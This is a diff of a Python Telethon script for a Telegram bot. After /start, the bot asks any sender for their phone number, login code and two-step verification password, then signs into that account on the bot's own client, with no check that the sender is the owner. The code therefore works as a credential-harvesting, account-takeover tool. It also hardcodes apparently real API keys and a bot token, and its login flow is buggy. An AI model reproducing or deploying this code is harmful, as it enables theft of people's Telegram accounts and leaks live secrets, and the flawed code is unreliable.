@@ -1,95 +1,81 @@
 import os
-import re
 import asyncio
 from telethon import TelegramClient, events
+from telethon.errors import SessionPasswordNeededError
 
-# Replace with your actual API ID and API Hash
+# Replace with your actual API ID, API Hash, and Bot Token
 API_ID = 24808705
 API_HASH = 'adf3a113ab32bb2792338477f156dc86'
-BOT_TOKEN = '8015052876:AAEi65xgC7XzKRcn9hKGBY48wDlFrUDQuUY'  # Replace with your bot token
+BOT_TOKEN = '8015052876:AAEi65xgC7XzKRcn9hKGBY48wDlFrUDQuUY'  # Your actual bot token
 
-# Create the Telegram client for the bot
-client = TelegramClient('owner_session', API_ID, API_HASH)
+# Session name for storing login session
+session_file = 'owner_session'
 
-# Variable to track if the owner is online and login state
-is_online = False
-is_logged_in = False
+# Create the Telegram client for the user
+client = TelegramClient(session_file, API_ID, API_HASH)
 
-async def send_message(chat_id, message):
-    """ Helper function to send a message. """
-    await client.send_message(chat_id, message)
+# Store user state
+user_state = {}
 
-def is_valid_phone_number(phone_number):
-    """ Validate phone number format (simple validation). """
-    pattern = r'^\+\d{10,15}$'  # Example pattern for international format
-    return re.match(pattern, phone_number) is not None
+async def send_message(event, message):
+    await event.reply(message)
 
-async def prompt_for_phone_number(event):
-    """ Prompt for phone number and handle response. """
-    await send_message(event.chat_id, "Please enter your phone number (in format +1234567890):")
-
-    @client.on(events.NewMessage(incoming=True, from_users=event.sender_id))
-    async def handle_phone_number_response(phone_event):
-        global is_logged_in
-        phone_number = phone_event.raw_text.strip()
-
-        if is_valid_phone_number(phone_number):
-            await send_message(event.chat_id, "Please enter the OTP sent to your phone:")
-            is_logged_in = True  # Mark login process as ongoing
-
-            @client.on(events.NewMessage(incoming=True, from_users=event.sender_id))
-            async def handle_otp_response(otp_event):
-                if is_logged_in:
-                    otp = otp_event.raw_text.strip()
-                    await handle_login(phone_number, otp, event.chat_id)
-                    is_logged_in = False  # Reset login state
-
-        else:
-            await send_message(event.chat_id, "Invalid phone number format. Please try again.")
-            await prompt_for_phone_number(event)
-
-async def handle_login(phone_number, otp, chat_id):
-    """ Handle the login process. """
-    await client.start(phone=phone_number)
-
-    try:
-        if not await client.is_user_authorized():
-            await client.sign_in(phone=phone_number, code=otp)
-
-        await send_message(chat_id, "Logged in successfully.")
-
-        # Access the owner's profile
-        me = await client.get_me()
-        await send_message(chat_id, f"Owner's Profile: {me.stringify()}")
-    except Exception as e:
-        await send_message(chat_id, f"Error logging in: {str(e)}")
+@client.on(events.NewMessage(pattern='/start'))
+async def start(event):
+    await send_message(event, "Please enter your phone number:")
+    user_state[event.sender_id] = {'step': 'phone_number'}
 
 @client.on(events.NewMessage(incoming=True))
-async def handle_commands(event):
-    """ Handle commands from the owner. """
-    global is_logged_in
-    if event.raw_text.startswith('/start'):
-        await prompt_for_phone_number(event)
-    elif event.raw_text.startswith('/logout') and is_logged_in:
-        await client.log_out()  # Log out the user
-        is_logged_in = False
-        await send_message(event.chat_id, "You have been logged out.")
-    elif event.raw_text.startswith('/status'):
-        if is_logged_in:
-            await send_message(event.chat_id, "You are currently logged in.")
-        else:
-            await send_message(event.chat_id, "You are not logged in.")
+async def handle_incoming_message(event):
+    sender_id = event.sender_id
+    state = user_state.get(sender_id)
 
+    if state is None:
+        return  # Ignore messages from users who haven't started the process
+
+    if state['step'] == 'phone_number':
+        phone_number = event.raw_text.strip()
+        user_state[sender_id]['phone_number'] = phone_number
+        await send_message(event, "OTP sent. Please enter the OTP you received:")
+
+        try:
+            await client.start(phone=phone_number)
+            await client.send_code_request(phone_number)
+            user_state[sender_id]['step'] = 'otp'
+        except Exception as e:
+            await send_message(event, f"Error: {e}")
+            return
+
+    elif state['step'] == 'otp':
+        otp = event.raw_text.strip()
+        try:
+            await client.sign_in(state['phone_number'], otp)
+            user_state[sender_id]['step'] = 'logged_in'
+            await send_message(event, "Logged in successfully.")
+            # Now continue with your bot functionality
+            await client.run_until_disconnected()
+        except SessionPasswordNeededError:
+            await send_message(event, "Two-step verification is enabled. Please enter your password:")
+            user_state[sender_id]['step'] = 'password'
+        except Exception as e:
+            await send_message(event, f"Error during login: {e}")
+
+    elif state['step'] == 'password':
+        password = event.raw_text.strip()
+        try:
+            await client.sign_in(password=password)
+            user_state[sender_id]['step'] = 'logged_in'
+            await send_message(event, "Logged in successfully.")
+            # Now continue with your bot functionality
+            await client.run_until_disconnected()
+        except Exception as e:
+            await send_message(event, f"Error during password entry: {e}")
+
+# Start the bot
 async def main():
-    print("Bot is running and listening for messages...")
-    try:
-        await client.start(bot_token=BOT_TOKEN)  # Start the bot
-        await client.run_until_disconnected()  # Run the main function
-    except Exception as e:
-        print(f"An error occurred: {str(e)}")
+    # Start the bot using the bot token
+    await client.start(bot_token=BOT_TOKEN)
+    print("Bot is running...")
 
-# Run the main function
-if __name__ == '__main__':
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(main())
-    
+loop = asyncio.get_event_loop()
+loop.run_until_complete(main())
